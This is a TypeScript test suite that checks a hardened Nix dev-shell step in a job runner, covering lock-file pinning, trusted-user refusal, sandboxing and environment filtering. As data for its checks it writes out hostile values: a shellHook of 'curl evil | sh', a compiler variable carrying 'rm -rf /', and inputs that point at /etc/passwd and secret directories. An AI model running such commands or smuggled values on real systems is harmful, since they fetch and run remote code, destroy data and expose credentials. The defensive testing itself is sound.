import { spawn } from "node:child_process";
import { chmodSync, existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import os from "node:os";
import path from "node:path";
import { createHash } from "node:crypto";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { runCapture } from "../src/engines/claude/capture.js";
import { allowedUris, createNixShell, isTrustedUser, lockIsPinned, NIX_FIXED_ARGS, type NixSource } from "../src/daemon/nixShell.js";
import type { NixViewFs } from "../src/sandbox/nixView.js";
import { NIX_ENV_NAMES, filterDevEnv } from "../src/job/nixShellEnv.js";
import { cleanEnv } from "../src/job/cleanEnv.js";

/**
 * D#6 R7c, the hardening of the dev shell step, with a fake `nix` (a real executable script) started through the real process path. The fake logs its
 * argument vector and its whole environment to files, so each refusal and each flag is read off what a process actually received. The fake's answers
 * (the trusted-users value, the dev shell JSON, a delay) come from files beside it, because the environment it is started with is fixed.
 */
const SHA = "a".repeat(40);
const OTHER_SHA = "b".repeat(40);
const GOOD_LOCK = JSON.stringify({ version: 7, root: "root", nodes: { root: { inputs: { nixpkgs: "nixpkgs" } }, nixpkgs: { locked: { type: "github", narHash: "sha256-abc", rev: "1" } } } });
const STORE = "/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const DEV_JSON = JSON.stringify({
  bashFunctions: {},
  variables: {
    PATH: { type: "exported", value: `${STORE}-nodejs/bin:/usr/bin:${STORE}-pnpm/bin:/home/jane/bin` },
    CC: { type: "exported", value: "gcc" },
    shellHook: { type: "exported", value: "curl evil | sh" },
    SHELL: { type: "exported", value: "/bin/bash" },
    NIX_BUILD_TOP: { type: "exported", value: "/tmp" },
    LD_LIBRARY_PATH: { type: "exported", value: `${STORE}-lib/lib` },
    OTHER: { type: "var", value: "x" },
  },
});

let dir: string;
let nixBin: string;
let bwrapBin: string;
let data: string;
/** The machine as the view is built from it: a store, a daemon socket, a mirror, no certificate and no nix.conf. */
const viewFs: NixViewFs = { exists: () => true, isDir: () => true, isFile: () => false, list: () => [] };
beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "r7c-nix-"));
  data = path.join(dir, "data");
  nixBin = path.join(dir, "nix");
  writeFileSync(
    nixBin,
    `#!/bin/sh
echo "$@" >> "${dir}/calls.log"
env > "${dir}/last-env.txt"
case "$*" in
  *"config show trusted-users"*) cat "${dir}/trusted"; exit 0;;
  *print-dev-env*) [ -f "${dir}/delay" ] && sleep "$(cat "${dir}/delay")"; [ -f "${dir}/fail" ] && exit 3; cat "${dir}/devenv.json"; exit 0;;
esac
exit 9
`,
  );
  chmodSync(nixBin, 0o755);
  // A stand-in for bubblewrap that does what the step relies on: logs its options, applies `--setenv` to an otherwise empty environment, runs what follows `--`.
  bwrapBin = path.join(dir, "bwrap");
  writeFileSync(
    bwrapBin,
    `#!/bin/sh
echo "$@" >> "${dir}/bwrap.log"
vars=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    --) shift; break;;
    --setenv) if [ "$2" = PATH ]; then vars="$vars PATH=$3:/run/current-system/sw/bin:/usr/bin:/bin"; else vars="$vars $2=$3"; fi; shift 3;;
    --proc|--dev|--tmpfs|--dir) shift 2;;
    --ro-bind) shift 3;;
    *) shift;;
  esac
done
exec env -i $vars "$@"
`,
  );
  chmodSync(bwrapBin, 0o755);
  writeFileSync(path.join(dir, "trusted"), "root\n");
  writeFileSync(path.join(dir, "devenv.json"), DEV_JSON);
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

const capture = (command: string, args: readonly string[], env: Record<string, string>, timeoutMs: number) => runCapture(spawn, command, args, env, timeoutMs, 8 * 1024 * 1024, 2048);
const flake = (lock: string | null = GOOD_LOCK): NixSource => ({ kind: "flake", mirrorDir: "/cache/mirrors/abc.git", lock });
const calls = (): string[] => (existsSync(path.join(dir, "calls.log")) ? readFileSync(path.join(dir, "calls.log"), "utf8").trim().split("\n") : []);
const devCalls = (): string[] => calls().filter((line) => line.includes("print-dev-env"));
const bwrapCalls = (): string[] => (existsSync(path.join(dir, "bwrap.log")) ? readFileSync(path.join(dir, "bwrap.log"), "utf8").trim().split("\n") : []);
const step = (over: { storeExists?: (entry: string) => boolean; user?: string; groups?: string[]; timeoutMs?: number; nixBin?: string | undefined; bwrapBin?: string | undefined; viewFs?: NixViewFs } = {}) =>
  createNixShell({ nixBin: "nixBin" in over ? over.nixBin : nixBin, bwrapBin: "bwrapBin" in over ? over.bwrapBin : bwrapBin, viewFs: over.viewFs ?? viewFs, capture, dataDir: data, storeExists: over.storeExists ?? (() => true), identity: async () => ({ user: over.user ?? "runner", groups: over.groups ?? ["users"] }), ...(over.timeoutMs === undefined ? {} : { timeoutMs: over.timeoutMs }) });

describe("the gate and the default-branch rule", () => {
  it("control: an approved job on a default-branch commit with a pinned lock gets the filtered shell", async () => {
    const result = await step().prepare({ approved: true, sha: SHA, source: flake() });
    expect(result).toEqual({ ok: true, cached: false, env: { PATH: `${STORE}-nodejs/bin:${STORE}-pnpm/bin`, CC: "gcc" } });
  });

  it("an unapproved job skips: nix is never started", async () => {
    expect(await step().prepare({ approved: false, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_not_approved" });
    expect(calls()).toEqual([]);
  });

  it("a commit that is not in the default branch's history skips with its own detail: nix is never started", async () => {
    expect(await step().prepare({ approved: true, sha: SHA, source: { kind: "not_default_branch" } })).toEqual({ ok: false, skip: "nix_not_default_branch" });
    expect(calls()).toEqual([]);
  });

  it("a base that is not a full commit id skips as not on the default branch", async () => {
    expect(await step().prepare({ approved: true, sha: "main", source: flake() })).toEqual({ ok: false, skip: "nix_not_default_branch" });
    expect(calls()).toEqual([]);
  });

  it("a repo with no flake.nix skips, as does a machine with no nix", async () => {
    expect(await step().prepare({ approved: true, sha: SHA, source: { kind: "no_flake" } })).toEqual({ ok: false, skip: "nix_no_flake" });
    expect(await step({ nixBin: undefined }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_not_installed" });
    expect(calls()).toEqual([]);
  });
});

describe("the flake.lock refusals", () => {
  it("a missing lock file is refused before nix starts", async () => {
    expect(await step().prepare({ approved: true, sha: SHA, source: flake(null) })).toEqual({ ok: false, skip: "nix_flake_lock_missing" });
    expect(calls()).toEqual([]);
  });

  it.each([
    ["an input with no lock entry", { version: 7, root: "root", nodes: { root: { inputs: { a: "a" } }, a: { original: { type: "github", owner: "o", repo: "r" } } } }],
    ["a locked entry with no content hash", { version: 7, root: "root", nodes: { root: { inputs: { a: "a" } }, a: { locked: { type: "github", rev: "1" } } } }],
    ["no root", { version: 7, nodes: {} }],
  ])("%s is refused before nix starts", async (_name, lock) => {
    expect(await step().prepare({ approved: true, sha: SHA, source: flake(JSON.stringify(lock)) })).toEqual({ ok: false, skip: "nix_flake_lock_unlocked" });
    expect(await step().prepare({ approved: true, sha: SHA, source: flake("not json") })).toEqual({ ok: false, skip: "nix_flake_lock_unlocked" });
    expect(calls()).toEqual([]);
  });

  it("lockIsPinned accepts a lock of pinned inputs and the lock of a flake with no inputs", () => {
    expect(lockIsPinned(GOOD_LOCK)).toBe(true);
    expect(lockIsPinned(JSON.stringify({ version: 7, root: "root", nodes: { root: {} } }))).toBe(true);
  });
});

/** A lock whose one input has this locked entry (a content hash is always present: the type and source are what is under test). */
const lockWith = (locked: Record<string, unknown>): string => JSON.stringify({ version: 7, root: "root", nodes: { root: { inputs: { a: "a" } }, a: { locked: { narHash: "sha256-abc", ...locked } } } });

describe("the locked input types (a hash does not make a local source safe: nix copies it into the store first)", () => {
  it.each([
    ["github", { type: "github", owner: "o", repo: "r", rev: "1" }],
    ["gitlab", { type: "gitlab", owner: "o", repo: "r", rev: "1" }],
    ["sourcehut", { type: "sourcehut", owner: "~o", repo: "r", rev: "1" }],
    ["git over https", { type: "git", url: "https://example.com/r.git", rev: "1" }],
    ["tarball over https", { type: "tarball", url: "https://example.com/r.tar.gz" }],
    ["file over https", { type: "file", url: "https://example.com/r.nix" }],
    ["a repo-relative path", { type: "path", path: "./vendor/lib" }],
    ["a bare repo-relative path", { type: "path", path: "vendor/lib" }],
  ])("control: %s is accepted", async (_name, locked) => {
    expect(lockIsPinned(lockWith(locked))).toBe(true);
    expect(await step().prepare({ approved: true, sha: SHA, source: flake(lockWith(locked)) })).toMatchObject({ ok: true });
  });

  it.each([
    ["an absolute path", { type: "path", path: "/srv/private/keys" }],
    ["a path with a leading ..", { type: "path", path: "../../secrets" }],
    ["a path with a .. segment inside", { type: "path", path: "vendor/../../secrets" }],
    ["a home path", { type: "path", path: "~/.config" }],
    ["a path with no path", { type: "path" }],
    ["file over file://", { type: "file", url: "file:///etc/passwd" }],
    ["tarball over file://", { type: "tarball", url: "file:///srv/private/x.tar" }],
    ["git over file://", { type: "git", url: "file:///srv/private/repo", rev: "1" }],
    ["git over ssh", { type: "git", url: "ssh://git@example.com/r.git", rev: "1" }],
    ["git over plain http", { type: "git", url: "http://example.com/r.git", rev: "1" }],
    ["git with a bare local path", { type: "git", url: "/srv/private/repo", rev: "1" }],
    ["tarball with no url", { type: "tarball" }],
    ["a mercurial input", { type: "mercurial", url: "https://example.com/r", rev: "1" }],
    ["an indirect input", { type: "indirect", id: "nixpkgs" }],
    ["a type nobody named", { type: "gopher", url: "https://example.com/r" }],
    ["no type", { owner: "o", repo: "r" }],
    ["a github input that fetches submodules", { type: "github", owner: "o", repo: "r", submodules: true }],
  ])("%s is refused before nix starts", async (_name, locked) => {
    expect(lockIsPinned(lockWith(locked))).toBe(false);
    expect(await step().prepare({ approved: true, sha: SHA, source: flake(lockWith(locked)) })).toEqual({ ok: false, skip: "nix_flake_lock_unlocked" });
    expect(calls()).toEqual([]);
  });

  it("one bad input among good ones refuses the whole lock", () => {
    const lock = JSON.stringify({ version: 7, root: "root", nodes: { root: { inputs: { a: "a", b: "b" } }, a: { locked: { type: "github", narHash: "sha256-a" } }, b: { locked: { type: "path", path: "/etc", narHash: "sha256-b" } } } });
    expect(lockIsPinned(lock)).toBe(false);
  });
});

describe("a repo with submodules", () => {
  it("skips with its own detail before nix starts", async () => {
    expect(await step().prepare({ approved: true, sha: SHA, source: { kind: "submodules" } })).toEqual({ ok: false, skip: "nix_submodules" });
    expect(calls()).toEqual([]);
  });
});

describe("trusted users", () => {
  it.each([
    ["the runner user by name", "root runner", "runner", ["users"]],
    ["everyone", "*", "runner", ["users"]],
    ["a group the runner user is in", "root @wheel", "runner", ["users", "wheel"]],
  ])("is refused when trusted-users names %s: the shell is not built", async (_name, setting, user, groups) => {
    writeFileSync(path.join(dir, "trusted"), `${setting}\n`);
    expect(await step({ user, groups }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_trusted_user" });
    expect(devCalls()).toEqual([]);
  });

  it("control: a group the user is not in, and other names, do not refuse", async () => {
    writeFileSync(path.join(dir, "trusted"), "root @wheel alice\n");
    expect((await step({ user: "runner", groups: ["users"] }).prepare({ approved: true, sha: SHA, source: flake() })).ok).toBe(true);
  });

  it("an unreadable setting or an unknown identity is refused too", async () => {
    const unknown = createNixShell({ nixBin, bwrapBin, viewFs, capture, dataDir: data, identity: async () => undefined });
    expect(await unknown.prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_config_unreadable" });
    expect(isTrustedUser("root", "runner", [])).toBe(false);
    expect(devCalls()).toEqual([]);
  });
});

describe("how nix is started", () => {
  it("passes the hardening flags and never accepts the flake's own config", async () => {
    await step().prepare({ approved: true, sha: SHA, source: flake() });
    const [line] = devCalls();
    expect(line).toContain("--no-write-lock-file");
    expect(line).toContain("--no-update-lock-file");
    expect(line).toContain("--option allow-import-from-derivation false");
    expect(line).toContain("--option accept-flake-config false");
    expect(line).toContain("--option allow-unsafe-native-code-during-evaluation false");
    expect(line).toContain(`print-dev-env --json `);
    expect(line).toContain(`git+file:///cache/mirrors/abc.git?rev=${SHA}`);
    for (const arg of NIX_FIXED_ARGS) expect(line).toContain(arg);
    expect(line).toContain("--option restrict-eval true");
  });

  it("lists as the only fetchable addresses those the lock names, and passes them to nix", async () => {
    const lock = lockWith({ type: "github", owner: "acme", repo: "lib", rev: "1" });
    await step().prepare({ approved: true, sha: SHA, source: flake(lock) });
    expect(devCalls()[0]).toContain("--option allowed-uris github:acme/lib/ ");
    await step().prepare({ approved: true, sha: OTHER_SHA, source: flake(GOOD_LOCK) });
    expect(devCalls()[1]).toContain("--option allowed-uris  git+file://"); // a lock that names no address allows none
  });

  it("allowedUris derives hosted and https prefixes from the lock and nothing from anywhere else", () => {
    expect(allowedUris(lockWith({ type: "github", owner: "acme", repo: "lib" }))).toEqual(["github:acme/lib/"]);
    expect(allowedUris(lockWith({ type: "tarball", url: "https://example.com/x/r.tar.gz?a=b" }))).toEqual(["file+https://example.com/x/", "git+https://example.com/x/", "https://example.com/x/", "tarball+https://example.com/x/"]);
    expect(allowedUris(JSON.stringify({ nodes: { root: {} }, root: "root", version: 7 }))).toEqual([]);
    expect(allowedUris("not json")).toEqual([]);
    // an odd character, a local source or a relative path adds nothing
    expect(allowedUris(lockWith({ type: "github", owner: "a b", repo: "c" }))).toEqual([]);
    expect(allowedUris(lockWith({ type: "path", path: "vendor/lib" }))).toEqual([]);
    expect(allowedUris(lockWith({ type: "file", url: "file:///etc/passwd" }))).toEqual([]);
  });

  it("starts nix only through bubblewrap, in a view that holds the allowlist and nothing else", async () => {
    await step().prepare({ approved: true, sha: SHA, source: flake() });
    expect(bwrapCalls().length).toBeGreaterThanOrEqual(2); // the trusted-users read and the shell, both in the view
    for (const line of bwrapCalls()) {
      expect(line).toContain("--clearenv");
      expect(line).toContain("--ro-bind /nix/store /nix/store");
      expect(line).toContain("--ro-bind /nix/var/nix/daemon-socket /nix/var/nix/daemon-socket");
      expect(line).toContain("--ro-bind /cache/mirrors/abc.git /cache/mirrors/abc.git");
      // every bind is read-only, and none names the step's data, the runner's home or the host's /tmp
      expect(line).not.toMatch(/--bind /);
      expect(line).not.toContain(data);
      expect(line).not.toContain(os.homedir());
      expect(line).not.toMatch(/--ro-bind \/tmp /);
    }
  });

  it("with no bubblewrap, or a view that cannot be built, skips with a closed code and starts nothing", async () => {
    const wanted = { ok: false, skip: "nix_view_unavailable" };
    expect(await step({ bwrapBin: undefined }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual(wanted);
    // no daemon socket to reach (single-user nix): nothing to build a view around
    expect(await step({ viewFs: { ...viewFs, exists: () => false } }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual(wanted);
    expect(await step({ viewFs: { ...viewFs, isDir: () => false } }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual(wanted);
    expect(await step({ nixBin: "/nonexistent/nix" }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual(wanted);
    expect(calls()).toEqual([]);
    expect(bwrapCalls()).toEqual([]);
  });

  it("starts nix with a fixed minimal environment: nothing from this process, however it is named", async () => {
    process.env["FX_R7C_CANARY"] = "canary-value";
    process.env["CLAUDE_CODE_OAUTH_TOKEN"] = "canary-token";
    try {
      await step().prepare({ approved: true, sha: SHA, source: flake() });
    } finally {
      delete process.env["FX_R7C_CANARY"];
      delete process.env["CLAUDE_CODE_OAUTH_TOKEN"];
    }
    const seen = readFileSync(path.join(dir, "last-env.txt"), "utf8");
    expect(seen).not.toContain("canary");
    const names = seen.trim().split("\n").map((line) => line.split("=")[0]).filter((name) => name !== "PWD" && name !== "SHLVL" && name !== "_" && name !== "OLDPWD").sort();
    expect(names).toEqual(["HOME", "LANG", "NIX_CONF_DIR", "NIX_REMOTE", "PATH", "TMPDIR", "XDG_CACHE_HOME"]);
    // the home the client sees is the view's own empty one, never the runner's and never the step's data directory
    expect(seen).toContain("HOME=/tmp/home");
    expect(seen).not.toContain(data);
  });

  it("stops a run that goes past the wall clock", async () => {
    writeFileSync(path.join(dir, "delay"), "5");
    const started = Date.now();
    expect(await step({ timeoutMs: 300 }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_timeout" });
    expect(Date.now() - started).toBeLessThan(4000);
  });

  it("maps a failed run, unreadable output and an empty shell to closed codes", async () => {
    writeFileSync(path.join(dir, "fail"), "");
    expect(await step().prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_failed" });
    rmSync(path.join(dir, "fail"));
    writeFileSync(path.join(dir, "devenv.json"), "{ not json");
    expect(await step().prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_output_invalid" });
    writeFileSync(path.join(dir, "devenv.json"), JSON.stringify({ variables: { SHELL: { type: "exported", value: "/bin/sh" } } }));
    expect(await step().prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_env_empty" });
  });
});

describe("the cache", () => {
  it("is keyed by the lock file's sha256 and the commit, under the data directory", async () => {
    const first = await step().prepare({ approved: true, sha: SHA, source: flake() });
    expect(first).toMatchObject({ ok: true, cached: false });
    const key = `${createHash("sha256").update(GOOD_LOCK).digest("hex")}-${SHA}.json`;
    expect(readdirSync(path.join(data, "cache"))).toEqual([key]);
    const second = await step().prepare({ approved: true, sha: SHA, source: flake() });
    expect(second).toMatchObject({ ok: true, cached: true });
    expect(devCalls()).toHaveLength(1);
  });

  it("a different commit, or a different lock file, builds again", async () => {
    await step().prepare({ approved: true, sha: SHA, source: flake() });
    await step().prepare({ approved: true, sha: OTHER_SHA, source: flake() });
    await step().prepare({ approved: true, sha: SHA, source: flake(GOOD_LOCK.replace("sha256-abc", "sha256-xyz")) });
    expect(devCalls()).toHaveLength(3);
  });

  it("a cached shell whose store paths have been collected is built again", async () => {
    await step().prepare({ approved: true, sha: SHA, source: flake() });
    expect(await step({ storeExists: () => false }).prepare({ approved: true, sha: SHA, source: flake() })).toMatchObject({ ok: true, cached: false });
    expect(devCalls()).toHaveLength(2);
  });

  it("a cache file that holds anything outside the allowlist is not used", async () => {
    await step().prepare({ approved: true, sha: SHA, source: flake() });
    const file = path.join(data, "cache", readdirSync(path.join(data, "cache"))[0]!);
    writeFileSync(file, JSON.stringify({ PATH: "/usr/bin:/home/jane/bin" }));
    expect(await step().prepare({ approved: true, sha: SHA, source: flake() })).toMatchObject({ ok: true, cached: false });
    expect(devCalls()).toHaveLength(2);
  });

  it("a trusted-user or unapproved call never reads the cache", async () => {
    await step().prepare({ approved: true, sha: SHA, source: flake() });
    expect(await step().prepare({ approved: false, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_not_approved" });
    writeFileSync(path.join(dir, "trusted"), "runner\n");
    expect(await step({ user: "runner" }).prepare({ approved: true, sha: SHA, source: flake() })).toEqual({ ok: false, skip: "nix_trusted_user" });
  });
});

describe("PLAYWRIGHT_BROWSERS_PATH (D#6 R7e B3): a store path only", () => {
  const browsers = (value: unknown) => filterDevEnv({ PLAYWRIGHT_BROWSERS_PATH: { type: "exported", value } });

  it("is on the allowlist and a store path is accepted", () => {
    expect(NIX_ENV_NAMES).toContain("PLAYWRIGHT_BROWSERS_PATH");
    expect(browsers(`${STORE}-playwright-browsers`)).toEqual({ PLAYWRIGHT_BROWSERS_PATH: `${STORE}-playwright-browsers` });
  });

  it("refuses a path outside the store, a relative path, a `..` path, a bare name and a list", () => {
    for (const bad of ["/home/someone/pw-browsers", "/nix/storefoo/x", "nix/store/abc-x", "./nix/store/abc-x", `${STORE}-x/../../etc`, "/nix/store/../etc", "chromium", `${STORE}-a:${STORE}-b`, "/nix/store/", ""]) {
      expect(browsers(bad), bad).toEqual({});
    }
  });

  it("is refused when the dev shell does not export it", () => {
    expect(filterDevEnv({ PLAYWRIGHT_BROWSERS_PATH: { type: "var", value: `${STORE}-playwright-browsers` } })).toEqual({});
  });

  it("cleanEnv checks it again and puts a store path into the job env", () => {
    const value = `${STORE}-playwright-browsers`;
    expect(cleanEnv({ mode: "subscription" }, { jobEnv: { PLAYWRIGHT_BROWSERS_PATH: value } })["PLAYWRIGHT_BROWSERS_PATH"]).toBe(value);
    for (const bad of ["/home/someone/pw", "pw", `${STORE}-x/../../etc`, "../nix/store/x"]) {
      expect(() => cleanEnv({ mode: "subscription" }, { jobEnv: { PLAYWRIGHT_BROWSERS_PATH: bad } }), bad).toThrow(/bad dev shell/);
    }
  });

  it("a host value of the same name never reaches the job", () => {
    vi.stubEnv("PLAYWRIGHT_BROWSERS_PATH", "/home/someone/pw");
    try {
      expect(cleanEnv({ mode: "subscription" })).not.toHaveProperty("PLAYWRIGHT_BROWSERS_PATH");
    } finally {
      vi.unstubAllEnvs();
    }
  });
});

describe("the handoff allowlist", () => {
  it("keeps only exported PATH-like and tool variables, and only store entries of the path-like ones", () => {
    expect(filterDevEnv(JSON.parse(DEV_JSON).variables)).toEqual({ PATH: `${STORE}-nodejs/bin:${STORE}-pnpm/bin`, CC: "gcc" });
  });

  it("drops shellHook, SHELL, NIX_*, LD_* and every name outside the list, however the value looks", () => {
    const variables = { shellHook: { type: "exported", value: "x" }, SHELL: { type: "exported", value: "/bin/sh" }, NIX_CFLAGS_COMPILE: { type: "exported", value: STORE }, LD_PRELOAD: { type: "exported", value: STORE }, HOME: { type: "exported", value: STORE }, ANTHROPIC_API_KEY: { type: "exported", value: "k" } };
    expect(filterDevEnv(variables)).toEqual({});
  });

  it("refuses a path-like entry that climbs out of the store, and a tool variable that is a command line", () => {
    expect(filterDevEnv({ PATH: { type: "exported", value: `${STORE}-x/../../../etc` }, CC: { type: "exported", value: "gcc; rm -rf /" }, CXX: { type: "exported", value: "/usr/bin/g++" } })).toEqual({});
  });

  it("cleanEnv carries the shell's variables into the job's environment after the host's own PATH, and refuses anything else", () => {
    const env = cleanEnv({ mode: "subscription" }, { extraPathDirs: ["/usr/bin"], jobEnv: { PATH: `${STORE}-nodejs/bin`, CC: "gcc" } });
    expect(env["CC"]).toBe("gcc");
    expect(env["PATH"]!.split(":").at(-1)).toBe(`${STORE}-nodejs/bin`);
    expect(() => cleanEnv({ mode: "subscription" }, { jobEnv: { SHELL: "/bin/sh" } })).toThrow(/not an allowed/);
    expect(() => cleanEnv({ mode: "subscription" }, { jobEnv: { PATH: "/usr/bin" } })).toThrow(/bad dev shell/);
    expect(() => cleanEnv({ mode: "subscription" }, { jobEnv: { shellHook: "x" } })).toThrow(/not an allowed/);
  });
});

describe("several jobs at once (D#6 C43-3)", () => {
  it("two jobs on one key start one build, and both get its environment (one fresh, one shared)", async () => {
    writeFileSync(path.join(dir, "delay"), "1");
    const input = { approved: true, sha: SHA, source: flake() };
    // Two step objects, as two jobs' wiring would hold: the rule is per cache file, not per object.
    const [one, two] = await Promise.all([step().prepare(input), step().prepare(input)]);
    expect(devCalls()).toHaveLength(1);
    const results = [one, two];
    expect(results.every((result) => result.ok)).toBe(true);
    expect(results.filter((result) => result.ok && !result.cached)).toHaveLength(1);
    expect(results.filter((result) => result.ok && result.cached)).toHaveLength(1);
    expect(one).toMatchObject({ ok: true, env: { PATH: `${STORE}-nodejs/bin:${STORE}-pnpm/bin`, CC: "gcc" } });
    expect(two).toMatchObject({ ok: true, env: (one as { env: object }).env });
    expect(readdirSync(path.join(data, "cache")).filter((name) => name.endsWith(".tmp"))).toEqual([]);
  });

  it("three jobs on one key still start one build", async () => {
    writeFileSync(path.join(dir, "delay"), "1");
    const input = { approved: true, sha: SHA, source: flake() };
    const all = await Promise.all([step().prepare(input), step().prepare(input), step().prepare(input)]);
    expect(all.every((result) => result.ok)).toBe(true);
    expect(devCalls()).toHaveLength(1);
  });

  it("jobs on different keys build at the same time", async () => {
    writeFileSync(path.join(dir, "delay"), "1");
    const started = Date.now();
    const [one, two] = await Promise.all([step().prepare({ approved: true, sha: SHA, source: flake() }), step().prepare({ approved: true, sha: OTHER_SHA, source: flake() })]);
    expect(one).toMatchObject({ ok: true, cached: false });
    expect(two).toMatchObject({ ok: true, cached: false });
    expect(devCalls()).toHaveLength(2);
    expect(Date.now() - started).toBeLessThan(1900);
  });

  it("a failed build is shared by the jobs that waited for it, and the next job tries again", async () => {
    writeFileSync(path.join(dir, "delay"), "1");
    writeFileSync(path.join(dir, "fail"), "");
    const input = { approved: true, sha: SHA, source: flake() };
    const failed = await Promise.all([step().prepare(input), step().prepare(input)]);
    expect(failed).toEqual([{ ok: false, skip: "nix_failed" }, { ok: false, skip: "nix_failed" }]);
    expect(devCalls()).toHaveLength(1);
    rmSync(path.join(dir, "fail"));
    rmSync(path.join(dir, "delay"));
    expect(await step().prepare(input)).toMatchObject({ ok: true, cached: false });
    expect(devCalls()).toHaveLength(2);
  });
});

